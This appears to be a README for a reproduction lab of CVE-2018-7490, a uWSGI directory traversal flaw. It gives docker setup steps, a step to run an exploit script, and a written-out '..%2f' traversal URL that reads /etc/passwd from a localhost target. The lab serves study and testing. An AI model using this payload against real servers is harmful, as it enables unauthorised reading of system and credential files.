# Directory Traversal vulnerability

**CWE-ID**: Directory traversal (22)  
**Exploit source**: [EDB: 44223](https://www.exploit-db.com/exploits/44223)  
**CVE-ID**: 2018-7490  
**CVSS score (version 2)**: 5.0  

## Description
uWSGI before 2.0.17 mishandles a DOCUMENT_ROOT check during use of the --php-docroot option, allowing directory traversal.
During testing it was observed that uWSGI was affected by a Directory Traversal vulnerability when executed as a standalone (without a front-end web server) along with the "php-docroot" option to enforce the DOCUMENT_ROOT of the web application.


## Exploit description

An attacker could exploit this vulnerability by using path traversal sequences ("..%2f") to access sensitive information. In this exploit we will access to /etc/passwd by accessing     
http://127.0.0.1:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

----------

## Requirements
* python3
* docker-compose


## Setup

Start the environment:

```
./install.sh
```

## Exploit
 1. Run `python3 exploit.py` and get content of /etc/passwd
 ![](1.png)



## Result

We can traversal in server system to get sensetive information
